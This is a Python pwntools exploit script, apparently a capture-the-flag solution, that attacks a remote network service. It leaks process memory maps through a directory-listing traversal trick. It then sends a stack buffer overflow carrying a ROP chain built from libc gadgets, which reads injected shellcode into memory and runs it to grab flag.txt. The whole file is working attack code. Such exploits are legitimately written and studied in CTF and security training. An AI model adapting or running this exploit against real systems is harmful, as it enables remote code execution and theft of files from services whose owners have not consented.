from pwn import *
import string

context.arch = 'amd64'

HOST = "10.123.15.53"
PORT = 12345
#HOST = "localhost"
#PORT = 1234

libc = ELF('./libc-2.17.so')
libc_base = 0x7fd9dcd83000

gadgets = {}
gadgets['system'] = libc.symbols['system']
gadgets['binsh'] = next(libc.search("/bin/sh\x00"))
gadgets['pop_rdi'] = 0x22298
gadgets['syscall'] = 0xc0065
gadgets['pop_rax'] = 0x1d150
gadgets['pop_rsi'] = 0x21738
gadgets['pop_rdx'] = 0x1b92
gadgets['xor_rax_rax'] = 0x8906f
gadgets['push_rax'] = 0xa5e8

context.log_level = 'ERROR'


def getDir(dirToList):
    print "Getting {}".format(dirToList)
    M = ""
    for i in range(0, 10):
        try:
            s = remote(HOST, PORT)
            payload = '/' * i + '{}/'.format(dirToList)
            s.sendline(payload)
            m = ""
            while True:
                try:
                    c = s.recv(1)
                    m += c
                except:
                    break
            s.close()
            if "Directory does not exist" not in m:
                M = m
                break
        except:
            s.close()
    return M

def getProcesses():
    m = getDir("/proc").strip('\n').split('\n')
    m = [int(x) for x in m if not any(e in x for e in (string.ascii_letters + string.punctuation))]
    return m

def getMapFiles(pid):
    m = getDir("/proc/{}/map_files".format(pid))
    return m

def createHang():
    s = remote(HOST, PORT)
    return s

def setRDI(num):
    return p64(gadgets['pop_rdi']) + p64(num)

def setRAX(num):
    return p64(gadgets['pop_rax']) + p64(num)

def setRSI(num):
    return p64(gadgets['pop_rsi']) + p64(num)

def setRDX(num):
    return p64(gadgets['pop_rdx']) + p64(num)

def readBuf(addr, length, fd=4, skipfd=False):
    payload = ""
    payload += setRAX(0)
    if not skipfd:
        payload += setRDI(fd)
    payload += setRSI(addr)
    payload += setRDX(length)
    payload += p64(gadgets['syscall'])
    return payload

def main():
    p = getProcesses()
    s = createHang()
    p1 = getProcesses()
    diff = [int(x) for x in p1 if x not in p]
    print diff
    for pid in diff:
        m = getMapFiles(pid)
        print m
    for k in gadgets.keys():
        gadgets[k] += libc_base
        print k, hex(gadgets[k])
    filename = "flag.txt"
    shellcode = filename + '\x00'
    shellcode += asm(open('shellcode.asm').read())

    payload = 'A' * (320 - 8)
    payload += p64(0)
    payload += 'B' * 8 # rbp

    payload += readBuf(0x601000, len(shellcode) + 1) # read file name
    payload += p64(0x601000 + len(filename + "\x00") + 1)

    print len(payload)
    s = createHang()
    print s.recv()

    s.sendline(payload)
    s.sendline(shellcode)

    print s.recv(40)


if __name__ == '__main__':
    main()
